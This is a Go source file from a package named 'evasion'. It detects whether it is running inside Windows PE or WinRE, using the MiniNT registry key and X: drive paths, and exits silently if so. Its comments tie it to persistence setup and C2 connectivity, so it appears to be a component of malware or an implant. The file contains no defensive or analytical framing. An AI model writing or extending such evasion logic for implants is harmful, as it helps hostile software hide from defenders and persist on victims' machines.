//go:build windows
// +build windows

package evasion

import (
	"os"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// isWinPE returns true when the process is running inside Windows PE or WinRE.
// Three independent signals are checked so a false-positive on any one of them
// doesn't cause an unnecessary exit.
func isWinPE() bool {
	// WinPE/WinRE always set this key; it is absent on a normal Windows install.
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`System\CurrentControlSet\Control\MiniNT`, registry.QUERY_VALUE)
	if err == nil {
		k.Close()
		return true
	}

	// WinRE boots from a RAM disk mounted at X:\
	exe, _ := os.Executable()
	if len(exe) >= 2 && strings.ToUpper(string(exe[0])) == "X" && exe[1] == ':' {
		return true
	}

	// %SystemRoot% pointing to X:\ is another reliable WinRE marker.
	sr := os.Getenv("SystemRoot")
	if len(sr) >= 2 && strings.ToUpper(string(sr[0])) == "X" && sr[1] == ':' {
		return true
	}

	return false
}

// exitIfWinPE silently exits when running inside WinPE or WinRE.
// Persistence setup and C2 connectivity have no meaning in a recovery
// environment and would only produce noise or errors.
func exitIfWinPE() {
	if isWinPE() {
		os.Exit(0)
	}
}
